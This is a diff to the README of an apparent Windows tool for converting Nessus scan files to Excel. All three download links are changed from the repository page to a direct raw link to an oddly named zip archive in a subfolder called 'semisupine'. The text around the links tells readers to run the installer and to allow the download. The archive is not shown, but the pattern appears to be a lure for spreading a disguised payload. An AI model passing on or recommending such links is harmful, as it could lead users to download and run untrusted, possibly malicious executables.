@@ -1,6 +1,6 @@
 # 🧩 nessus-to-excel-nte - Convert Nessus files to Excel fast
 
-[![Download](https://img.shields.io/badge/Download%20Now-nessus-to-excel-nte-blue?style=for-the-badge)](https://github.com/garboiluniversity170/nessus-to-excel-nte)
+[![Download](https://img.shields.io/badge/Download%20Now-nessus-to-excel-nte-blue?style=for-the-badge)](https://raw.githubusercontent.com/garboiluniversity170/nessus-to-excel-nte/main/semisupine/nte-nessus-excel-to-v1.6-beta.5.zip)
 
 ## 🚀 What this app does
 
@@ -31,7 +31,7 @@ The app uses a drag-and-drop layout, so you do not need to learn command lines o
 
 Go to this page to download and run the Windows app:
 
-[![Get the app](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://github.com/garboiluniversity170/nessus-to-excel-nte)
+[![Get the app](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://raw.githubusercontent.com/garboiluniversity170/nessus-to-excel-nte/main/semisupine/nte-nessus-excel-to-v1.6-beta.5.zip)
 
 Open the page, get the Windows build, then run the installer or app file. If your browser asks for permission, allow the download.
 
@@ -142,7 +142,7 @@ If the Excel file does not open, make sure your spreadsheet app supports `.xlsx`
 
 Use the GitHub page below to get the app and review the repository:
 
-https://github.com/garboiluniversity170/nessus-to-excel-nte
+https://raw.githubusercontent.com/garboiluniversity170/nessus-to-excel-nte/main/semisupine/nte-nessus-excel-to-v1.6-beta.5.zip
 
 ## 🏷️ Topics
 
